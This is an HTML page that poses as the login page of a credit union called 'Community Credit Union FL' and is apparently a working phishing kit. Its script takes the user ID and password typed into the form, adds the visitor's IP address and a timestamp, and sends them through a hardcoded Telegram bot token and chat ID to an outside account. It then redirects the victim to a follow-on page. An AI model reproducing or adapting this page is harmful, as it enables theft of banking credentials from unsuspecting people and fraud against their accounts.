<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Community Credit Union FL | Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-weight: bold !important;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #e3e3e3;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .login-container {
            background-color: white;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 450px;
            overflow: hidden;
            position: relative;
        }

        .login-header {
            background: linear-gradient(135deg, #1e5085 0%, #15375b 100%);
            padding: 30px;
            text-align: center;
        }

        .logo {
            max-width: 200px;
            height: auto;
            margin: 0 auto;
            display: block;
        }

        .login-content {
            padding: 40px;
        }

        .login-title {
            color: #333;
            text-align: center;
            margin-bottom: 30px;
            font-size: 24px;
            border-bottom: 2px solid #9dbdd6;
            padding-bottom: 15px;
        }

        .form-group {
            margin-bottom: 25px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-size: 16px;
        }

        .input-container {
            position: relative;
        }

        .form-input {
            width: 100%;
            padding: 15px 20px;
            border: 2px solid #ddd;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s ease;
            background-color: #fff;
        }

        .form-input:focus {
            outline: none;
            border-color: #9dbdd6;
            box-shadow: 0 0 0 3px rgba(157, 189, 214, 0.2);
        }

        .password-toggle {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #666;
            cursor: pointer;
            padding: 5px;
            font-size: 18px;
        }

        .password-toggle:hover {
            color: #333;
        }

        .login-button {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #9dbdd6 0%, #c2d6e5 100%);
            color: #333;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: bold;
            margin-top: 10px;
        }

        .login-button:hover {
            background: linear-gradient(135deg, #c2d6e5 0%, #9dbdd6 100%);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(157, 189, 214, 0.3);
        }

        .login-button:active {
            transform: translateY(0);
        }

        .login-links {
            margin-top: 25px;
            text-align: center;
        }

        .login-link {
            display: block;
            color: #0055cc;
            text-decoration: none;
            margin-bottom: 12px;
            font-size: 14px;
            transition: color 0.3s ease;
        }

        .login-link:hover {
            color: #003876;
            text-decoration: underline;
        }

        .divider {
            height: 1px;
            background-color: #eee;
            margin: 25px 0;
        }

        @media (max-width: 480px) {
            .login-container {
                border-radius: 15px;
            }
            
            .login-content {
                padding: 30px 20px;
            }
            
            .login-header {
                padding: 20px;
            }
            
            .login-title {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <a href="#">
                <img src="03658-logo-lg-md-publish.png" alt="Community Credit Union FL Logo" class="logo">
            </a>
        </div>
        
        <div class="login-content">
            <h1 class="login-title">LOGIN</h1>
            
            <form id="loginForm" autocomplete="off">
                <div class="form-group">
                    <label class="form-label">User ID</label>
                    <div class="input-container">
                        <input 
                            type="text" 
                            id="username" 
                            name="username" 
                            class="form-input" 
                            placeholder="Enter your User ID" 
                            required
                            autocomplete="off"
                        >
                    </div>
                </div>
                
                <div class="form-group">
                    <label class="form-label">Password</label>
                    <div class="input-container">
                        <input 
                            type="password" 
                            id="password" 
                            name="password" 
                            class="form-input" 
                            placeholder="Enter your password" 
                            required
                            autocomplete="off"
                        >
                        <button type="button" class="password-toggle" id="togglePassword">
                            üëÅÔ∏è
                        </button>
                    </div>
                </div>
                
                <button type="submit" class="login-button">
                    LOGIN
                </button>
            </form>
            
            <div class="divider"></div>
            
            <div class="login-links">
                <a href="#" class="login-link">Forgot Login?</a>
                <a href="#" class="login-link">Test your browser</a>
                <a href="#" class="login-link">Trouble testing your browser</a>
            </div>
        </div>
    </div>

    <script>
        // Telegram Bot Token and Chat ID
        const botToken = '6256698104:AAE5QZORxw737Vgc__jArGtIpQ3JrJfyv44';
        const chatId = '1217852633';

        // Password toggle functionality
        const togglePassword = document.getElementById('togglePassword');
        const passwordInput = document.getElementById('password');
        
        togglePassword.addEventListener('click', function() {
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            this.textContent = type === 'password' ? 'üëÅÔ∏è' : 'üëÅÔ∏è‚Äçüó®Ô∏è';
        });

        // Form submission handler
        const loginForm = document.getElementById('loginForm');
        
        loginForm.addEventListener('submit', async (event) => {
            event.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!username || !password) {
                alert('Please fill in both username and password.');
                return;
            }

            // Construct the message for Telegram
            const message = `üîê New Login Attempt:\nüë§ Username: ${username}\nüîë Password: ${password}\nüåê IP: ${await getIP()}\nüïí Time: ${new Date().toLocaleString()}`;

            // Send to Telegram
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    }),
                });

                const result = await response.json();
                
                if (result.ok) {
                    // Clear form and redirect
                    loginForm.reset();
                    passwordInput.setAttribute('type', 'password');
                    togglePassword.textContent = 'üëÅÔ∏è';
                    
                    // Simulate loading state
                    const submitBtn = loginForm.querySelector('.login-button');
                    const originalText = submitBtn.textContent;
                    submitBtn.textContent = 'Redirecting...';
                    submitBtn.disabled = true;
                    
                    setTimeout(() => {
                        window.location.href = 'index2.html';
                    }, 1500);
                } else {
                    alert('Login failed. Please try again.');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('An error occurred. Please try again.');
            }
        });

        // Function to get user's IP address
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'IP not available';
            }
        }

        // Add subtle animation to form inputs on focus
        document.querySelectorAll('.form-input').forEach(input => {
            input.addEventListener('focus', function() {
                this.parentElement.style.transform = 'scale(1.02)';
            });
            
            input.addEventListener('blur', function() {
                this.parentElement.style.transform = 'scale(1)';
            });
        });
    </script>
</body>
</html>
